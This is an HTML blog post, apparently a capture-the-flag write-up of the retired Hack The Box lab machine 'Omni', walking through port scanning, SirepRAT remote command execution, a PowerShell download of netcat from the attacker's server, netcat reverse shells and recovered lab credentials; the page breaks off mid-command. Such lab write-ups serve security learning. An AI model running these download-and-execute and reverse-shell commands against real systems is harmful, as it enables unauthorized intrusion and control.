@@ -1,0 +1,870 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+</script><script type="text/javascript" src="/lightgallery/lightbox.js"></script>
+<link rel="stylesheet" href="/lightgallery/lightbox.css">
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<link rel="preload" as="style" href="/assets/css/post.css">
+<link rel="preload" as="style" href="/assets/css/syntax.css">
+<link rel="stylesheet" href="/assets/css/post.css">
+<link rel="stylesheet" href="/assets/css/syntax.css">
+<link rel="preload" as="style" href="/assets/lib/bootstrap-toc-1.0.1/bootstrap-toc.min.css">
+<link rel="preload" as="script" href="/assets/lib/bootstrap-toc-1.0.1/bootstrap-toc.min.js">
+<link rel="stylesheet" href="/assets/lib/bootstrap-toc-1.0.1/bootstrap-toc.min.css"/>
+<script src="/assets/lib/bootstrap-toc-1.0.1/bootstrap-toc.min.js" async></script>
+<script src="/assets/js/dist/toc.min.js" async></script>
+<meta name="description" content="Getting TGT using secretdump for usernames got from smb dirs and using rpcclient to chnage the user password , got a zip file that was a memory dump and getting NTLM hash of user lsass mimikatz ad then admin is around dumping the ntds.dit file."/>
+<meta property="og:title" content="Hackthebox Omni writeup"/>
+<meta property="og:description" content="Getting TGT using secretdump for usernames got from smb dirs and using rpcclient to chnage the user password , got a zip file that was a memory dump and getting NTLM hash of user lsass mimikatz ad then admin is around dumping the ntds.dit file."/>
+<meta property="og:image" content="/hackthebox/omni/omni.jpg"/>
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:site" content="@0xdedinfosec">
+<meta property="twitter:title" content="Hackthebox Omni writeup">
+<meta name="twitter:creator" content="@0xdedinfosec">
+<meta name="twitter:description" content="Getting TGT using secretdump for usernames got from smb dirs and using rpcclient to chnage the user password , got a zip file that was a memory dump and getting NTLM hash of user lsass mimikatz ad then admin is around dumping the ntds.dit file.">
+<meta name="twitter:image" content="https://0xdedinfosec.github.io/hackthebox/omni/omni.jpg">
+<title>Hackthebox Omni writeup | 0xDedinfosec</title>
+<meta name="generator" content="Jekyll v4.1.0"/>
+<meta property="og:title" content="Hackthebox Omni writeup"/>
+<meta name="author" content="Dedinfosec"/>
+<meta property="og:locale" content="en_US"/>
+<meta name="description" content="Introduction@Omni:~$"/>
+<meta property="og:description" content="Introduction@Omni:~$"/>
+<link rel="canonical" href="http://0xdedinfosec.github.io/posts/htb-omni/"/>
+<meta property="og:url" content="http://0xdedinfosec.github.io/posts/htb-omni/"/>
+<meta property="og:site_name" content="0xDedinfosec"/>
+<meta property="og:type" content="article"/>
+<meta property="article:published_time" content="2020-08-24T00:00:00+00:00"/>
+<meta name="twitter:card" content="summary"/>
+<meta property="twitter:title" content="Hackthebox Omni writeup"/>
+<meta name="twitter:site" content="@0xdedinfosec"/>
+<meta name="twitter:creator" content="@Dedinfosec"/>
+<meta name="google-site-verification" content="UfGDXP7MiKxFhS_R1LKVTpk3Cf20Hj-53gHZJrOFXuA"/>
+<script type="application/ld+json">
+     {"@type":"BlogPosting","headline":"Hackthebox Omni writeup","dateModified":"2020-10-30T00:00:00+00:00","datePublished":"2020-10-30T00:00:00+00:00","mainEntityOfPage":{"@type":"WebPage","@id":"http://0xdedinfosec.github.io/posts/htb-omni/"},"author":{"@type":"Person","name":"Dedinfosec"},"url":"http://0xdedinfosec.github.io/posts/htb-omni/","description":"Introduction@Omni:~$","@context":"https://schema.org"}
+</script>
+<link rel="shortcut icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon">
+<link rel="icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon">
+<link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon.png">
+<link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon-precomposed.png">
+<link rel="apple-touch-icon" sizes="57x57" href="/apple-icon-57x57.png">
+<link rel="apple-touch-icon" sizes="60x60" href="/apple-icon-60x60.png">
+<link rel="apple-touch-icon" sizes="72x72" href="/apple-icon-72x72.png">
+<link rel="apple-touch-icon" sizes="76x76" href="/apple-icon-76x76.png">
+<link rel="apple-touch-icon" sizes="114x114" href="/apple-icon-114x114.png">
+<link rel="apple-touch-icon" sizes="120x120" href="/apple-icon-120x120.png">
+<link rel="apple-touch-icon" sizes="144x144" href="/apple-icon-144x144.png">
+<link rel="apple-touch-icon" sizes="152x152" href="/apple-icon-152x152.png">
+<link rel="apple-touch-icon" sizes="180x180" href="/apple-icon-180x180.png">
+<link rel="icon" type="image/png" sizes="192x192"  href="/android-icon-192x192.png">
+<link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+<link rel="icon" type="image/png" sizes="96x96" href="/favicon-96x96.png">
+<link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+<link rel="manifest" href="/assets/img/favicons/manifest.json">
+<meta name='msapplication-config' content='/assets/img/favicons/browserconfig.xml'>
+<meta name="msapplication-TileColor" content="#ffffff">
+<meta name="msapplication-TileImage" content="/assets/img/favicons/ms-icon-144x144.png">
+<meta name="theme-color" content="#ffffff">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous">
+<link rel="dns-prefetch" href="https://fonts.gstatic.com">
+<link rel="preconnect" href="cdn.jsdelivr.net">
+<link rel="dns-prefetch" href="cdn.jsdelivr.net">
+<link rel="preload" as="style" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css" integrity="sha256-LA89z+k9fjgMKQ/kq4OO2Mrf8VltYml/VES+Rg0fh20=" crossorigin>
+<link rel="preload" as="style" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css" integrity="sha256-+N4/V/SbAFiW1MPBCXnfnP9QSN3+Keu+NlB+0ev/YKQ=" crossorigin="anonymous">
+<link rel="preload" as="style" href="/assets/css/main.css">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css" integrity="sha256-LA89z+k9fjgMKQ/kq4OO2Mrf8VltYml/VES+Rg0fh20=" crossorigin="anonymous">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css" integrity="sha256-+N4/V/SbAFiW1MPBCXnfnP9QSN3+Keu+NlB+0ev/YKQ=" crossorigin="anonymous">
+<link rel="stylesheet" href="/assets/css/main.css">
+<link rel="preload" as="script" href="https://cdn.jsdelivr.net/npm/jquery@3.4.1/dist/jquery.min.js" integrity="sha256-CSXorXvZcTkaix6Yvo6HppcZGetbYMGWSFlBw8HfCJo=" crossorigin="anonymous">
+<link rel="preload" as="script" href="https://cdn.jsdelivr.net/npm/popper.js@1.15.0/dist/umd/popper.min.js" integrity="sha256-fTuUgtT7O2rqoImwjrhDgbXTKUwyxxujIMRIK7TbuNU=" crossorigin>
+<script src="https://cdn.jsdelivr.net/npm/jquery@3.4.1/dist/jquery.min.js" integrity="sha256-CSXorXvZcTkaix6Yvo6HppcZGetbYMGWSFlBw8HfCJo=" crossorigin="anonymous"></script>
+<script>
+    window.jQuery || document.write('<script src="/assets/lib/jquery-3.4.1.min.js"><\/script>');
+</script>
+<script src="https://cdn.jsdelivr.net/npm/popper.js@1.15.0/dist/umd/popper.min.js" integrity="sha256-fTuUgtT7O2rqoImwjrhDgbXTKUwyxxujIMRIK7TbuNU=" crossorigin="anonymous" async></script>
+<script src="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/js/bootstrap.min.js" integrity="sha256-5+02zu5UULQkO7w1GIr6vftCgMfFdZcAHeDtFnKZsBs=" crossorigin="anonymous" async></script>
+<script src="/assets/js/dist/commons.js" async></script>
+<script src="/assets/js/dist/timeago.min.js" async></script>
+<link rel="preload" as="style" href="/assets/css/post.css">
+<link rel="preload" as="style" href="/assets/css/syntax.css">
+<link rel="stylesheet" href="/assets/css/post.css">
+<link rel="stylesheet" href="/assets/css/syntax.css">
+<link rel="preload" as="style" href="/assets/lib/bootstrap-toc-1.0.1/bootstrap-toc.min.css">
+<link rel="preload" as="script" href="/assets/lib/bootstrap-toc-1.0.1/bootstrap-toc.min.js">
+<link rel="stylesheet" href="/assets/lib/bootstrap-toc-1.0.1/bootstrap-toc.min.css"/>
+<script src="/assets/lib/bootstrap-toc-1.0.1/bootstrap-toc.min.js" async></script>
+<script src="/assets/js/dist/toc.min.js" async></script>
+<meta name="description" content="Getting TGT using secretdump for usernames got from smb dirs and using rpcclient to chnage the user password , got a zip file that was a memory dump and getting NTLM hash of user lsass mimikatz ad then admin is around dumping the ntds.dit file."/>
+<meta property="og:title" content="Hackthebox Omni writeup"/>
+<meta property="og:description" content="Getting TGT using secretdump for usernames got from smb dirs and using rpcclient to chnage the user password , got a zip file that was a memory dump and getting NTLM hash of user lsass mimikatz ad then admin is around dumping the ntds.dit file."/>
+<meta property="og:image" content="/hackthebox/omni/omni.jpg"/>
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:site" content="@0xdedinfosec">
+<meta property="twitter:title" content="Hackthebox Omni writeup">
+<meta name="twitter:creator" content="@0xdedinfosec">
+<meta name="twitter:description" content="Getting TGT using secretdump for usernames got from smb dirs and using rpcclient to chnage the user password , got a zip file that was a memory dump and getting NTLM hash of user lsass mimikatz ad then admin is around dumping the ntds.dit file.">
+<meta name="twitter:image" content="https://0xdedinfosec.github.io/hackthebox/omni/omni.jpg">
+<script src="/assets/js/dist/tooltip-loader.min.js" async></script>
+<body data-spy="scroll" data-target="#toc">
+    <div id="sidebar" class="d-flex flex-column">
+        <div id="nav-wrapper">
+            <div id="profile-wrapper" class="d-flex flex-column">
+                <div id="avatar" class="d-flex justify-content-center">
+                    <a href="/" alt="avatar">
+                        <img src="/assets/img/sample/avater1.png" alt="avatar">
+                    </a>
+                </div>
+                <div class="profile-text mt-3">
+                    <div id="site-title">
+                        <a href="/">0xDedinfosec</a>
+                    </div>
+                    <div id="site-subtitle" class="font-italic">InfoSec/Cybersec Blog And Writeups</div>
+                </div>
+            </div>
+            <ul class="nav flex-column">
+                <li class="nav-item d-flex justify-content-center ">
+                    <a href="/" class="nav-link d-flex justify-content-center align-items-center w-100">
+                        <i class="fa-fw fas fa-home ml-3 mr-3 unloaded"></i>
+                        <span>HOME</span>
+                    </a>
+                </li>
+                <li class="nav-item d-flex justify-content-center ">
+                    <a href="/tabs/donation/" class="nav-link d-flex justify-content-center align-items-center w-100">
+                        <i class="fa-fw fab fa-donate ml-3 mr-3 unloaded"></i>
+                        <span>DONATION-OSCP</span>
+                    </a>
+                </li>
+                <li class="nav-item d-flex justify-content-center ">
+                    <a href="/tabs/categories/" class="nav-link d-flex justify-content-center align-items-center w-100">
+                        <i class="fa-fw fas fa-stream ml-3 mr-3 unloaded"></i>
+                        <span>CATEGORIES</span>
+                    </a>
+                </li>
+                <li class="nav-item d-flex justify-content-center ">
+                    <a href="/tabs/tags/" class="nav-link d-flex justify-content-center align-items-center w-100">
+                        <i class="fa-fw fas fa-tags ml-3 mr-3 unloaded"></i>
+                        <span>TAGS</span>
+                    </a>
+                </li>
+                <li class="nav-item d-flex justify-content-center ">
+                    <a href="/tabs/archives/" class="nav-link d-flex justify-content-center align-items-center w-100">
+                        <i class="fa-fw fas fa-archive ml-3 mr-3 unloaded"></i>
+                        <span>TIMELINE</span>
+                    </a>
+                </li>
+                <li class="nav-item d-flex justify-content-center ">
+                    <a href="/tabs/about/" class="nav-link d-flex justify-content-center align-items-center w-100">
+                        <i class="fa-fw fas fa-info ml-3 mr-3 unloaded"></i>
+                        <span>WHOAMI</span>
+                    </a>
+                </li>
+            </ul>
+        </div>
+        <div class="sidebar-bottom d-flex flex-wrap justify-content-around mt-4">
+            <span id="mode-toggle-wrapper">
+                <!-- Switch the mode between dark and light. v2.1 https://github.com/cotes2020/jekyll-theme-chirpy © 2020 Cotes Chung MIT License -->
+                <i class="mode-toggle fas fa-sun" light-mode-invisible></i>
+                <i class="mode-toggle fas fa-moon" dark-mode-invisible></i>
+                <script type="text/javascript">
+                    class ModeToggle {
+                        static get MODE_KEY() {
+                            return "mode";
+                        }
+                        static get DARK_MODE() {
+                            return "dark";
+                        }
+                        static get LIGHT_MODE() {
+                            return "light";
+                        }
+                        constructor() {
+                            if (this.mode != null) {
+                                if (this.mode == ModeToggle.DARK_MODE) {
+                                    if (!this.isDarkPrefer) {
+                                        this.setDark();
+                                    }
+                                } else {
+                                    if (this.isDarkPrefer) {
+                                        this.setLight();
+                                    }
+                                }
+                            }
+                            var self = this;
+                            /* always follow the system prefers */
+                            this.sysDarkPrefers.addListener(function() {
+                                if (self.mode != null) {
+                                    if (self.mode == ModeToggle.DARK_MODE) {
+                                        if (!self.isDarkPrefer) {
+                                            self.setDark();
+                                        }
+                                    } else {
+                                        if (self.isDarkPrefer) {
+                                            self.setLight();
+                                        }
+                                    }
+                                    self.clearMode();
+                                }
+                            });
+                        }
+                        /* constructor() */
+                        setDark() {
+                            $('html').attr(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE);
+                            sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE);
+                        }
+                        setLight() {
+                            $('html').attr(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE);
+                            sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE);
+                        }
+                        clearMode() {
+                            $('html').removeAttr(ModeToggle.MODE_KEY);
+                            sessionStorage.removeItem(ModeToggle.MODE_KEY);
+                        }
+                        get sysDarkPrefers() {
+                            return window.matchMedia("(prefers-color-scheme: dark)");
+                        }
+                        get isDarkPrefer() {
+                            return true;
+                        }
+                        get mode() {
+                            return sessionStorage.getItem(ModeToggle.MODE_KEY);
+                        }
+                        flipMode() {
+                            if ((this.mode == null && this.isDarkPrefer) || this.mode == ModeToggle.DARK_MODE) {
+                                this.setLight();
+                            } else {
+                                /* light mode or default-light */
+                                this.setDark();
+                            }
+                        }
+                    }
+                    /* ModeToggle */
+                    let toggle = new ModeToggle();
+                    $(".mode-toggle").click(function() {
+                        toggle.flipMode();
+                    });
+                </script>
+            </span>
+            <span class="icon-border"></span>
+            <a href="https://www.hackthebox.eu/home/users/profile/262485" target="_blank">
+            </i><i class="fas fa-cube"></i>
+            </a>
+            <a href="https://github.com/0xdedinfosec" target="_blank">
+                <i class="fab fa-github"></i>
+            </a>
+            <a href="#">
+                <i class="fab fa-discord"></i>
+            </a>
+            <a href="#">
+                <i class="fab fa-twitter"></i>
+            </a>
+            <a href="https://www.facebook.com/dedsecinfoServices/" target="_blank"> <i class="fab fa-facebook"></i> </a>
+            </div></div>
+<div id="main-wrapper">
+    <!-- The Top Bar v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License -->
+    <div id="topbar-wrapper" class="row justify-content-center topbar-down">
+        <div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between">
+            <span id="breadcrumb">
+                <span>
+                    <a href="/">Posts </a>
+                </span>
+                <span>Hackthebox Omni writeup</span>
+            </span>
+            <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i>
+            <div id="topbar-title">Post</div>
+            <i id="search-trigger" class="fas fa-search fa-fw"></i>
+            <span id="search-wrapper" class="align-items-center">
+                <i class="fas fa-search fa-fw"></i>
+                <input class="form-control" id="search-input" type="search" placeholder="Search...">
+                <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i>
+            </span>
+            <span id="search-cancel">Cancel</span>
+        </div>
+    </div>
+    <div id="main">
+        <div class="row">
+            <div id="post-wrapper" class="col-12 col-lg-11 col-xl-8">
+                <div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4">
+                    <h1 data-toc-skip>Hackthebox Omni writeup</h1>
+                    <div class="post-meta text-muted d-flex flex-column">
+                        <div>
+                            <span class="timeago" data-toggle="tooltip" data-placement="bottom" title="Tue, Jun 9, 2020, 12:00 AM +0000">
+                                Aug 24, 2020 <i class="unloaded">2020-08-24T00:00:00+00:00</i>
+                            </span>
+                            on <a href='/categories/hackthebox/'>Hackthebox</a>
+                            , <a href='/categories/retired/'>retired</a>
+                        </div>
+                    </div>
+                    <div class="post-content">
+                        <img src="/hackthebox/omni/omni.jpg">
+                        <h1 id="introductiontravel">Introduction@Omni:~$</h1>
+                        <table>
+                            <thead>
+                                <tr>
+                                    <th>Column
+                                    <th>
+                                        Details
+                                        <tbody>
+                                            <tr>
+                                                <td>Name
+                                                <td>
+                                                    Omni
+                                                    <tr>
+                                                        <td>IP
+                                                        <td>
+                                                            10.10.10.204
+                                                            <tr>
+                                                                <td>Points
+                                                                <td>
+                                                                    20
+                                                                    <tr>
+                                                                        <td>Os
+                                                                        <td>
+                                                                            Other
+                                                                            <tr>
+                                                                                <td>Difficulty
+                                                                                <td>
+                                                                                    Easy
+                                                                                    <tr>
+                                                                                        <td>Creator
+                                                                                        <td>
+                                                                                            <a href="https://www.hackthebox.eu/home/users/profile/1190" target="_blank">egre55</a>
+                                                                                            <tr>
+                                                                                                <td>Out On
+                                                                                                <td>22  Aug 2020
+                        </table>
+                        <h1 id="brieftravel">Brief@Omni:~$</h1>
+                        <ul><li><code class="language-plaintext highlighter-rouge">nmap</code><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Scanning found open ports and services:, </font></font><code class="language-plaintext highlighter-rouge">8080(web)</code><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">and it shows yes </font></font><code class="language-plaintext highlighter-rouge">Windows Device Portal</code><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">.</font></font></li><li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Use </font></font><code class="language-plaintext highlighter-rouge">Windows Iot</code><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">exploits </font></font><code class="language-plaintext highlighter-rouge">SirepRAT</code><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">to execute code.</font></font></li><li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Use </font></font><code class="language-plaintext highlighter-rouge">powershell invoke-webrequest</code><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">download </font></font><code class="language-plaintext highlighter-rouge">nc64.exe</code><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">.</font></font></li><li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Rebound the shell, enumerate, find the </font></font><code class="language-plaintext highlighter-rouge">r.bat</code><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">file and its credentials.</font></font></li><li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Sign in with credentials </font></font><code class="language-plaintext highlighter-rouge">8080</code><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">service port.</font></font></li><li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Use </font></font><code class="language-plaintext highlighter-rouge">Windows Device Portal</code><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">the function </font><font style="vertical-align: inherit;">of </font><font style="vertical-align: inherit;">executing code to rebound the shell again.</font></font></li><li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Enumerate to find the flag file.</font></font></li><li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Use </font></font><code class="language-plaintext highlighter-rouge">powershell</code><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">decryption.</font></font></li><li><code class="language-plaintext highlighter-rouge">root</code><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Same as above.</font></font></li></ul>
+                                <h1 id="recon">Recon</h1>
+                                <h2 id="nmap">Nmap</h2>
+                                <div class="language-bash highlighter-rouge">
+                                    <div class="highlight">
+                                        <code>
+                                                <table class="rouge-table">
+                                                    <tbody>
+                                                        <tr>
+                                                            <td class="rouge-gutter gl">
+                                                                <pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+</pre>
+                                                            <td class="rouge-code">
+                                                                <pre>
+
+Nmap scan report for 10.10.10.204
+Host is up (0.30s latency).
+Not shown: 65529 filtered ports
+PORT      STATE SERVICE  VERSION
+135/tcp   open  msrpc    Microsoft Windows RPC
+5985/tcp  open  upnp     Microsoft IIS httpd
+8080/tcp  open  upnp     Microsoft IIS httpd
+| http-auth: 
+| HTTP/1.1 401 Unauthorized\x0D
+|   Basic realm=Windows Device Portal
+| http-server-header: Microsoft-HTTPAPI/2.0
+| http-title: Site doesn't have a title.
+29817/tcp open  unknown
+29819/tcp open  arcserve ARCserve Discovery
+29820/tcp open  unknown
+Service Info: Host: PING; OS: Windows; CPE: cpe:/o:microsoft:windows
+                                                                </pre>
+                                                </table>
+                                            </code>
+                                    </div>
+                                </div>
+                                <li>From the Nmap results, we can say that our machine is a <code class="language-plaintext highlighter-rouge">Windows-based</code> one. Let’s discuss the services in each port.</li>
+                                                
+                                                
+                                                        <li class="py-3"><code class="language-plaintext highlighter-rouge">Port 135</code> – Windows RPC – Client/Server Application. It is mostly opened in the Windows server for a Client/Server model.</li>
+                                                        <li class="py-1"><code class="language-plaintext highlighter-rouge">Port 5985</code> – Windows – Remote Management (WinRM).</li>
+                                                        <li class="py-2"><code class="language-plaintext highlighter-rouge">Port 8080</code> – Seems to be a Web-Server with Realm “Windows Device Portal”.</li>
+                                                        <li class="py-2"><code class="language-plaintext highlighter-rouge">Ports 29817,29820</code> – Unknown Ports. This means that Nmap can’t find the possible services from IANA Port Numbers Registry.</li>
+                                                        <li class="py-2"><code class="language-plaintext highlighter-rouge">Port 29819</code> – Arcserve Discovery. It’s a Backup Configuration protocol used by DS (Discovery Server) in Windows.</li>
+                                                        <h2 class="mt-4 py-3"><code class="language-plaintext highlighter-rouge">Port 29819</code></h2>
+                                                
+                                                        <div class="language-bash highlighter-rouge">
+                                                            <pre><code style="color: white;">
+    root@DEDSEC:~# nc 10.10.10.204 29819
+    PING
+                                                        </code></pre>
+                                                        </div>
+                                                
+                                                        <li>PING? This is something similar to ‘echo’ service running on Port 7 TCP/UDP. So, leaving it now. <code class="language-plaintext highlighter-rouge">Port 29817</code> didn’t respond back.</li>
+                                                
+                                                        <h2 class="mt-4 py-3"><code class="language-plaintext highlighter-rouge">Port 20820</code></h2>
+                                                
+                                                        <div class="language-bash highlighter-rouge">
+                                                            <pre><code style="color: white;">
+    root@DEDSEC:~# nc 10.10.10.204 20820
+    *LY??`G?m?}?0
+                                                        </code></pre>
+                                                        </div>
+                                                
+                                                        <li>This port was thrown me nothing but a non-readable string. Seems like Rabbit hole. Without wasting time, I hit the firefox for Port 8080.
+                                                
+                                                </li>
+                                                
+                                                        <h1 class="mt-4 py-3"><code class="language-plaintext highlighter-rouge">Web Enumeration</code></h1>
+                                                            <li>As all the ports are confusing, I tried NC against port <code class="language-plaintext highlighter-rouge">8080</code>.</li>
+                                                
+                                                        <hr class="my-4">
+                                                        <img src="/hackthebox/omni/web.png" class="port" class="py-3" class="width=" 100%" height="255">
+                                                        <hr class="my-4">
+                                                        <li>The common <code class="language-plaintext highlighter-rouge">credentials</code> aren’t worked out. So I hit the Forum discussion to check if there are any hints available or not.</li>
+                                                        <li>People were talking about a script where they found it as a hook for the machine.</li>
+                                                        <hr class="my-4">
+                                                
+                                                        <h1 class="mt-4 py-3">SirepRAT RCE – Windows IOT Core – Initial Shell</h1>
+                                                        <hr class="my-3">
+                                                        <img src="/hackthebox/omni/google.png" class="port" class="width=" 100%" height="400" alt="">
+                                                
+                                                        <hr class="my-4">
+                                                
+                                                        <li>Okay. There is a script that people are talking about. It is used to abuse the <code class="language-plaintext highlighter-rouge">Sirep Test Service</code> which is usually running on the Windows IoT device cause an RCE on the device.</li>
+                                                        <li class="py-2"><code class="language-plaintext highlighter-rouge">Reference</code> :  <a href="https://github.com/SafeBreach-Labs/SirepRAT">SirepRAT</a></li>
+                                                        <li>And Also Download Windows Netcat Binary <code class="language-plaintext highlighter-rouge">(64 bit)</code> from :  <a href="https://eternallybored.org/misc/netcat/">Here</a></li>
+                                                        <li class="py-2">Extract netcat Binary And Go In The directory And  and start <code class="language-plaintext highlighter-rouge">SimpleHTTPServer</code>.</li>
+                                                
+                                                        <div class="language-bash highlighter-rouge">
+                                                            <pre><code style="color: white;">
+    root@DEDSEC:~# python -m SimpleHTTPServer
+    Serving HTTP on 0.0.0.0 port 8000 ...
+                                                        </code></pre>
+                                                        </div>
+                                                
+                                                        <li>Now lets run <code class="language-plaintext highlighter-rouge">SirepRAT</code>. Get inside SirepRAT directory and run</li>
+                                                
+                                                
+                                                        <hr class="my-3">
+                                                        <div class="language-bash highlighter-rouge">
+                                                            <pre><code style="color: white;">
+    root@DEDSEC:~# python SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --cmd "C:\Windows\System32\cmd.exe" --args "/c powershell Invoke-Webrequest -OutFile C:\\Windows\\System32\\spool\\drivers\\color\\nc64.exe -Uri http://10.10.14.208:8000/nc64.exe" --v
+                                                        </code></pre>
+                                                        </div>
+                                                        <li>The Command was Executed successfully.</li>
+                                                
+                                                
+                                                        <li>Lets look at <code class="language-plaintext highlighter-rouge">SimpleHTTPServer</code>, and it looks like the box made a Web-Request and we have uploaded our file successfully</li>
+                                                
+                                                        <hr class="my-2">
+                                                        <div class="language-bash highlighter-rouge">
+                                                            <pre><code style="color: white;">
+    root@DEDSEC:~# python -m SimpleHTTPServer
+    Serving HTTP on 0.0.0.0 port 8000 ...
+    10.10.10.204 - - [23/Aug/2020 23:37:49] "GET /nc64.exe HTTP/1.1" 200 -
+                                                        </code></pre>
+                                                        </div>
+                                                
+                                                
+                                                
+                                                
+                                                        <li>Now get your Netcat listener ready.</li>
+                                                
+                                                
+                                                        <div class="language-bash highlighter-rouge">
+                                                            <pre><code style="color: white;">
+    root@DEDSEC:~# nc -nvlp 4444
+    listening on [any] 4444 ....
+                                                        </code></pre>
+                                                        </div>
+                                                
+                                                
+                                                        <li>Now let's execute Netcat on the box. With Help Of <code class="language-plaintext highlighter-rouge">SirepRAT</code></li>
+                                                
+                                                
+                                                        <div class="language-bash highlighter-rouge">
+                                                            <pre><code style="color: white;">
+    root@DEDSEC:~# python SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --cmd "C:\Windows\System32\cmd.exe" --args "/c C:\\Windows\\System32\\spool\\drivers\\color\\nc64.exe 10.10.... 4444 -e powershell.exe" --v
+                                                        </code></pre>
+                                                        </div>
+                                                
+                                                
+                                                
+                                                        <li>We got our first <code class="language-plaintext highlighter-rouge">shell</code> in the machine.</li>
+                                                
+                                                        <hr class="my-2">
+                                                
+                                                        <div class="language-bash highlighter-rouge">
+                                                            <pre><code style="color: white;">
+    root@DEDSEC:~# nc -nvlp 4444
+    listening on [any] 1234 ....
+    connect to [10.10....] from omni.htb [10.10.10.204] 49686
+    Windows PowerShell
+    Copyright (C) Microsoft Corporation. All rights reserved.
+    PS C:\windows\system32> 
+                                                        </code></pre>
+                                                        </div>
+                                                        
+                                                        <li>We can't use whoami, but we could use <code class="language-plaintext highlighter-rouge">$env:UserName</code> to know the Username. </li>
+                                                
+                                                        <div class="language-bash highlighter-rouge">
+                                                            <pre><code style="color: white;">
+    root@DEDSEC:~# nc -nvlp 4444
+    listening on [any] 1234 ....
+    connect to [10.10....] from omni.htb [10.10.10.204] 49686
+    Windows PowerShell
+    Copyright (C) Microsoft Corporation. All rights reserved.
+    PS C:\windows\system32> $env:UserName
+    $env:UserName
+    omni$
+    PS C:\windows\system32>
+                                                        </code></pre>
+                                                        </div>
+                                                
+                                                
+                                                        <li>We are User Omni and it has no rights to read in <code class="language-plaintext highlighter-rouge">user.txt</code> neither <code class="language-plaintext highlighter-rouge">root.txt</code>. Thus we need to enumerate further. </li>
+                                                        <li>After further Enumeration we got in a directory. </li>
+                                                
+                                                        <li><code class="language-plaintext highlighter-rouge"> "c:\Program Files\WindowsPowershell\Modules\PackageManagement"</code></li>
+                                                
+                                                        <img src="/hackthebox/omni/shell.png" class="port" class="py-3" class="width= 100%" height="520px" alt="">
+                                                
+                                                <hr class="my-2">
+                                                        <li>We Got Two Creads</li>
+                                                        <li class="py-2"><code class="language-plaintext highlighter-rouge">Username</code> app</li>
+                                                        <li> Password: <code class="language-plaintext highlighter-rouge">mesh5143</code></li>
+                                                        <li class="py-2"><code class="language-plaintext highlighter-rouge">Username</code> administrator</li>
+                                                        <li> Password: <code class="language-plaintext highlighter-rouge">_1nt3rn37ofTh1nGz</code></li>
+                                                        <hr class="my-2">
+                                                        <li>Remember the Webserver running on <code class="language-plaintext highlighter-rouge">Port 8080</code>. We could use our credentials there. </li>
+                                                
+                                                        <li>Lets jump into Firefox. Login via app:mesh5143</li>
+                                                        <li>The credential <code class="language-plaintext highlighter-rouge">app:mesh5143 </code> worked and we have the ability to run the command with user “app” privileges. Let’s gain a reverse <code class="language-plaintext highlighter-rouge">shell</code></li>
+                                                
+                                                
+                                                        <div class="language-bash highlighter-rouge">
+                                                            <pre><code style="color: white;">
+    $ C:\Windows\System32\spool\drivers\color\nc.exe 10.10...... 1235 -e powershell.exe
+                                                        </code></pre>
+                                                        </div>
+                                                
+                                                        <h2>Lets start a <code class="language-plaintext highlighter-rouge">ncat</code> lisner</h2>
+                                                        <hr class="my-2">
+                                                        <div class="language-bash highlighter-rouge">
+                                                            <pre><code style="color: white;">
+    root@DEDSEC:~# nc -nvlp 1235
+    listening on [any] 1234 ....
+                                                        </code></pre>
+                                                        </div>
+                                                
+                                                
+                                                
+                                                        <img src="/hackthebox/omni/cmd.png" class="port" class="py-3" class="width=" 100%" height="450" alt="">
+                                                        <hr class="my-2">
+                                                        <li>The website will show <code class="language-plaintext highlighter-rouge">"Failed to run the command"</code> but you'd still get your shell. </li>
+                                                        
+                                                        <div class="language-bash highlighter-rouge">
+                                                            <pre><code style="color: white;">
+    root@DEDSEC:~# nc -nvlp 1235
